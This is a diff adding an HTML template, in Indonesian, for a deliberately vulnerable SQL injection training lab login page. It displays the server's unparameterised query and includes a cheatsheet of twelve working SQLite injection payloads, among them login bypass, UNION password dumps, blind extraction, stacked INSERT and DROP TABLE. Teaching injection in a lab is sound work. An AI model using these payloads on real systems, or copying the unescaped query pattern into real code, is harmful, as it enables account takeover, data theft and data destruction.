@@ -1,0 +1,698 @@
+<!doctype html>
+<html lang="id">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Login — SQLi Lab</title>
+        <link
+            rel="stylesheet"
+            href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+        />
+        <style>
+            /* ── Base ───────────────────────────────────────────────────────────── */
+            body {
+                background-color: #0d1117;
+                color: #c9d1d9;
+                font-family: "Segoe UI", system-ui, sans-serif;
+            }
+            a {
+                color: #58a6ff;
+            }
+
+            /* ── Cards ──────────────────────────────────────────────────────────── */
+            .card {
+                background-color: #161b22;
+                border: 1px solid #30363d;
+                border-radius: 8px;
+            }
+            .card-header {
+                border-bottom: 1px solid #30363d;
+                font-size: 0.9rem;
+                padding: 10px 16px;
+            }
+            .hdr-red {
+                background: #3d1a1a;
+                color: #ff7b72;
+            }
+            .hdr-green {
+                background: #1a3a2a;
+                color: #56d364;
+            }
+            .hdr-yellow {
+                background: #2f2400;
+                color: #e3b341;
+            }
+            .hdr-blue {
+                background: #0d2137;
+                color: #79c0ff;
+            }
+            .hdr-gray {
+                background: #21262d;
+                color: #8b949e;
+            }
+
+            /* ── Code / pre ─────────────────────────────────────────────────────── */
+            pre,
+            code {
+                font-family:
+                    "Cascadia Code", "Fira Code", "Consolas", monospace;
+                font-size: 0.82rem;
+            }
+            pre {
+                background: #010409;
+                border: 1px solid #30363d;
+                border-radius: 6px;
+                padding: 12px 16px;
+                white-space: pre-wrap;
+                word-break: break-all;
+                color: #c9d1d9;
+                margin-bottom: 0;
+            }
+            code {
+                background: #21262d;
+                color: #79c0ff;
+                padding: 1px 6px;
+                border-radius: 4px;
+            }
+
+            /* Injection highlight inside the constructed query */
+            .inject-val {
+                background: rgba(255, 123, 114, 0.18);
+                color: #ff7b72;
+                border-bottom: 1px dashed #ff7b72;
+                padding: 0 2px;
+            }
+            .inject-quote {
+                color: #e3b341;
+            }
+            .inject-static {
+                color: #8b949e;
+            }
+
+            /* ── Form controls ──────────────────────────────────────────────────── */
+            .form-control {
+                background-color: #010409;
+                border: 1px solid #30363d;
+                color: #c9d1d9;
+                font-family:
+                    "Cascadia Code", "Fira Code", "Consolas", monospace;
+                font-size: 0.88rem;
+            }
+            .form-control:focus {
+                background-color: #010409;
+                border-color: #58a6ff;
+                color: #c9d1d9;
+                box-shadow: 0 0 0 2px rgba(88, 166, 255, 0.25);
+            }
+            .form-control::placeholder {
+                color: #3d444d;
+            }
+            label {
+                color: #8b949e;
+                font-size: 0.78rem;
+                text-transform: uppercase;
+                letter-spacing: 0.07em;
+                margin-bottom: 4px;
+            }
+            .btn-exec {
+                background: #238636;
+                border: 1px solid #2ea043;
+                color: #fff;
+                width: 100%;
+                font-size: 0.9rem;
+                padding: 8px;
+            }
+            .btn-exec:hover {
+                background: #2ea043;
+                color: #fff;
+            }
+
+            /* ── Alerts ─────────────────────────────────────────────────────────── */
+            .alert-danger {
+                background: #3d1a1a;
+                border-color: #da3633;
+                color: #ff7b72;
+            }
+            .alert-success {
+                background: #1a3a2a;
+                border-color: #2ea043;
+                color: #56d364;
+            }
+            .alert-info {
+                background: #0d2137;
+                border-color: #1f6feb;
+                color: #79c0ff;
+            }
+            .alert-warning {
+                background: #2f2400;
+                border-color: #d29922;
+                color: #e3b341;
+            }
+
+            /* ── Table ──────────────────────────────────────────────────────────── */
+            .table {
+                color: #c9d1d9;
+                font-size: 0.83rem;
+            }
+            .table thead th {
+                background: #21262d;
+                color: #79c0ff;
+                border-color: #30363d;
+            }
+            .table td,
+            .table th {
+                border-color: #30363d !important;
+            }
+            .table tbody tr:hover {
+                background: #1c2128;
+            }
+
+            /* ── Misc ───────────────────────────────────────────────────────────── */
+            hr {
+                border-color: #30363d;
+            }
+            .badge-vuln {
+                background: #da3633;
+                color: #fff;
+                font-size: 0.55em;
+                padding: 3px 8px;
+                border-radius: 4px;
+                vertical-align: middle;
+                letter-spacing: 0.04em;
+            }
+            .badge-tech {
+                font-size: 0.72rem;
+                padding: 2px 7px;
+                border-radius: 4px;
+                background: #21262d;
+                color: #8b949e;
+                border: 1px solid #30363d;
+            }
+            .cheat-item {
+                padding: 8px 0;
+                border-bottom: 1px solid #21262d;
+            }
+            .cheat-item:last-child {
+                border-bottom: none;
+            }
+            .bypass-banner {
+                background: linear-gradient(135deg, #1a3a2a, #0f2318);
+                border: 1px solid #2ea043;
+                border-radius: 8px;
+                padding: 14px 18px;
+                margin-bottom: 16px;
+            }
+            .bypass-banner .title {
+                font-size: 1.05rem;
+                font-weight: 700;
+                color: #56d364;
+            }
+
+            /* ── Cheatsheet query highlighting ──────────────────────────────────── */
+            /* .qs  = bagian query yang ditulis server (static)                      */
+            /* .qi  = bagian yang diinjeksikan user (merah)                          */
+            /* .qco = bagian yang ter-comment-out oleh -- (redup)                   */
+            .qs {
+                color: #8b949e;
+            }
+            .qi {
+                color: #ff7b72;
+                background: rgba(255, 123, 114, 0.13);
+                border-radius: 2px;
+                padding: 0 1px;
+            }
+            .qco {
+                color: #3d444d;
+            }
+            .cheat-pre {
+                margin-top: 8px;
+                margin-bottom: 0;
+                font-size: 0.78rem;
+                line-height: 1.65;
+            }
+            .cheat-legend {
+                font-size: 0.72rem;
+                margin-top: 6px;
+                color: #484f58;
+            }
+        </style>
+    </head>
+
+    <body>
+        <div class="container py-5" style="max-width: 820px">
+            <!-- ── Page heading ──────────────────────────────────────────────────── -->
+            <div class="d-flex align-items-center mb-4">
+                <h2 class="mb-0 mr-3" style="color: #58a6ff; font-weight: 700">
+                    Login
+                </h2>
+                <span class="badge-vuln">⚠ SQL INJECTION LAB</span>
+            </div>
+
+            <!-- ── Flash messages ────────────────────────────────────────────────── -->
+            {% with messages = get_flashed_messages(with_categories=true) %} {%
+            if messages %} {% for category, message in messages %}
+            <div
+                class="alert alert-{{ category }} alert-dismissible fade show"
+                role="alert"
+            >
+                {{ message }}
+                <button type="button" class="close" data-dismiss="alert">
+                    <span style="color: inherit">&times;</span>
+                </button>
+            </div>
+            {% endfor %} {% endif %} {% endwith %}
+
+            <!-- ── Login bypass banner ───────────────────────────────────────────── -->
+            {% if login_bypass %}
+            <div class="bypass-banner mb-4">
+                <div class="title">✅ LOGIN BYPASS BERHASIL!</div>
+                <div
+                    style="color: #8b949e; font-size: 0.85rem; margin-top: 4px"
+                >
+                    Injeksi SQL berhasil mengembalikan baris dari database.
+                    Autentikasi terlewati tanpa mengetahui password yang benar.
+                </div>
+            </div>
+            {% endif %}
+
+            <!-- ── Constructed query display ────────────────────────────────────── -->
+            {% if executed_query is not none %}
+            <div class="card mb-4">
+                <div class="card-header hdr-red">
+                    <strong>📤 Query yang dikonstruksi server</strong>
+                    <span
+                        style="float: right; font-size: 0.78rem; color: #8b949e"
+                    >
+                        f-string concat → SQLite (tanpa parameterisasi)
+                    </span>
+                </div>
+                <div class="card-body p-3">
+                    <pre><span class="inject-static">SELECT * FROM users WHERE username = </span><span class="inject-quote">'</span><span class="inject-val">{{ raw_username }}</span><span class="inject-quote">'</span><span class="inject-static"> AND password = </span><span class="inject-quote">'</span><span class="inject-val">{{ raw_password }}</span><span class="inject-quote">'</span></pre>
+                    <div
+                        style="
+                            margin-top: 8px;
+                            font-size: 0.78rem;
+                            color: #8b949e;
+                        "
+                    >
+                        <span style="color: #ff7b72">■</span> Merah = nilai dari
+                        input user (langsung disuntik ke query) &nbsp;&nbsp;
+                        <span style="color: #e3b341">■</span> Kuning = tanda
+                        kutip yang bisa di-escape
+                    </div>
+                </div>
+            </div>
+            {% endif %}
+
+            <!-- ── Per-statement results ─────────────────────────────────────────── -->
+            {% if query_results %}
+            <h6
+                style="
+                    color: #8b949e;
+                    text-transform: uppercase;
+                    letter-spacing: 0.08em;
+                    font-size: 0.78rem;
+                "
+            >
+                🗄 Hasil Eksekusi
+                <span class="badge badge-secondary ml-1"
+                    >{{ query_results|length }} statement(s)</span
+                >
+            </h6>
+
+            {% for result in query_results %} {% if result.error %}
+            <!-- Error result -->
+            <div class="card mb-3">
+                <div class="card-header hdr-yellow">
+                    <strong>⚠ Statement {{ loop.index }} — SQL Error</strong>
+                </div>
+                <div class="card-body p-3">
+                    <pre style="color: #e3b341">{{ result.stmt }}</pre>
+                    <div
+                        class="alert alert-warning mt-2 mb-0"
+                        style="font-size: 0.85rem"
+                    >
+                        <strong>SQLiteError:</strong> {{ result.error }}
+                    </div>
+                </div>
+            </div>
+
+            {% elif result.columns %}
+            <!-- SELECT / result-returning statement -->
+            <div class="card mb-3">
+                <div class="card-header hdr-green">
+                    <strong
+                        >✔ Statement {{ loop.index }} — {{ result.rows|length }}
+                        row(s) returned</strong
+                    >
+                    {% if login_bypass and loop.first %}
+                    <span
+                        class="badge badge-success ml-2"
+                        style="background: #2ea043; font-size: 0.72rem"
+                    >
+                        bypass via this result
+                    </span>
+                    {% endif %}
+                </div>
+                <div class="card-body p-0">
+                    <pre class="m-3 mb-2">{{ result.stmt }}</pre>
+                    {% if result.rows %}
+                    <div class="table-responsive px-3 pb-3">
+                        <table class="table table-sm table-bordered mb-0">
+                            <thead>
+                                <tr>
+                                    {% for col in result.columns %}
+                                    <th>{{ col }}</th>
+                                    {% endfor %}
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for row in result.rows %}
+                                <tr>
+                                    {% for val in row %}
+                                    <td>{{ val }}</td>
+                                    {% endfor %}
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                    {% else %}
+                    <div
+                        class="alert alert-info mx-3 mb-3"
+                        style="font-size: 0.85rem"
+                    >
+                        Query berhasil dieksekusi — tidak ada baris yang
+                        dikembalikan.
+                    </div>
+                    {% endif %}
+                </div>
+            </div>
+
+            {% else %}
+            <!-- DML / DDL statement -->
+            <div class="card mb-3">
+                <div class="card-header hdr-blue">
+                    <strong
+                        >ℹ Statement {{ loop.index }} — DML / DDL
+                        Executed</strong
+                    >
+                </div>
+                <div class="card-body p-3">
+                    <pre>{{ result.stmt }}</pre>
+                    <div
+                        class="alert alert-info mt-2 mb-0"
+                        style="font-size: 0.85rem"
+                    >
+                        Query berhasil dieksekusi. {% if result.rowcount is not
+                        none and result.rowcount >= 0 %} Rows affected:
+                        <strong>{{ result.rowcount }}</strong>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+            {% endif %} {% endfor %} {% endif %}
+
+            <hr class="my-4" />
+
+            <!-- ── Login form ────────────────────────────────────────────────────── -->
+            <div class="card mb-4">
+                <div class="card-header hdr-gray">
+                    <strong>🔑 Login Form</strong>
+                </div>
+                <div class="card-body">
+                    <form method="POST" autocomplete="off">
+                        <div class="form-group mb-3">
+                            <label for="username">
+                                Username
+                                <span class="badge-vuln ml-1"
+                                    >INJECTION POINT</span
+                                >
+                            </label>
+                            <input
+                                type="text"
+                                class="form-control"
+                                id="username"
+                                name="username"
+                                value="{{ raw_username }}"
+                                placeholder="e.g.  ' OR '1'='1' --"
+                                autofocus
+                            />
+                            <small style="color: #3d444d; font-size: 0.76rem">
+                                Nilai ini langsung disuntikkan ke dalam query
+                                SQL tanpa escaping. Gunakan
+                                <code>--</code> untuk komentar,
+                                <code>;</code> untuk stacked queries.
+                            </small>
+                        </div>
+
+                        <div class="form-group mb-3">
+                            <label for="password">Password</label>
+                            <input
+                                type="text"
+                                class="form-control"
+                                id="password"
+                                name="password"
+                                value="{{ raw_password }}"
+                                placeholder="password (boleh kosong saat SQLi)"
+                            />
+                            <small style="color: #3d444d; font-size: 0.76rem">
+                                Login normal: username <code>admin</code> /
+                                password <code>admin123</code>
+                            </small>
+                        </div>
+
+                        <button type="submit" class="btn btn-exec">
+                            ▶ Eksekusi SQL / Login
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- ── SQLi cheatsheet ───────────────────────────────────────────────── -->
+            <div class="card">
+                <div class="card-header hdr-gray">
+                    <strong>📋 Cheatsheet — Full Query yang Terbentuk</strong>
+                    <span
+                        style="float: right; font-size: 0.75rem; color: #484f58"
+                    >
+                        <span style="color: #8b949e">■</span> server &nbsp;
+                        <span style="color: #ff7b72">■</span> injected &nbsp;
+                        <span style="color: #3d444d">■</span> commented-out
+                    </span>
+                </div>
+                <div class="card-body pb-1">
+                    <!-- 1. Classic bypass -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Classic bypass</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            OR selalu TRUE → kembalikan semua baris
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' OR '1'='1' --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 2. Comment bypass -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Comment bypass</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            login sebagai user tertentu tanpa tahu password
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">admin' --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 3. Union-based -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Union-based</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            gabungkan hasil dengan data dari tabel lain
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' UNION SELECT 1,username,password FROM users --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 4. Schema enumeration -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Schema enum</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            dump semua nama tabel dan definisi kolomnya
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' UNION SELECT name,sql FROM sqlite_master WHERE type='table' --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 5. Error-based -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Error-based</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            pancing SQLiteError yang bocorkan nilai data
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 6. Boolean blind -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Boolean blind</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            respons beda untuk TRUE/FALSE → ekstrak data
+                            karakter per karakter
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='a' --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 7. Time-based blind -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Time-based blind</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            delay respons jika kondisi TRUE (randomblob di
+                            SQLite)
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' AND 1=(SELECT CASE WHEN (1=1) THEN randomblob(150000000) ELSE 0 END) --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 8. Stacked — INSERT -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Stacked — INSERT</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            sisipkan statement DML setelah query login pertama
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">'; INSERT INTO users(username,password) VALUES('hacker','pwned') --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 9. Stacked — DROP -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Stacked — DROP</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            hapus tabel sepenuhnya (destructive!)
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">'; DROP TABLE users --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 10. Stacked — multi statement -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">Stacked — multi</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            insert user baru lalu verifikasi hasilnya sekaligus
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">'; INSERT INTO users(username,password) VALUES('hacker','pwned'); SELECT * FROM users --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 11. PRAGMA -->
+                    <div class="cheat-item">
+                        <span class="badge-tech">PRAGMA</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            baca info internal schema SQLite
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' UNION SELECT name,sql FROM pragma_table_info('users') --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+
+                    <!-- 12. sqlite_version -->
+                    <div class="cheat-item" style="border-bottom: none">
+                        <span class="badge-tech">sqlite_version</span>
+                        <span
+                            style="
+                                color: #8b949e;
+                                font-size: 0.78rem;
+                                margin-left: 6px;
+                            "
+                        >
+                            fingerprint versi database target
+                        </span>
+                        <pre
+                            class="cheat-pre"
+                        ><span class="qs">SELECT * FROM users WHERE username = '</span><span class="qi">' UNION SELECT sqlite_version(),'fingerprint' --</span><span class="qco">' AND password = ''</span></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /container -->
+
+        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    </body>
+</html>
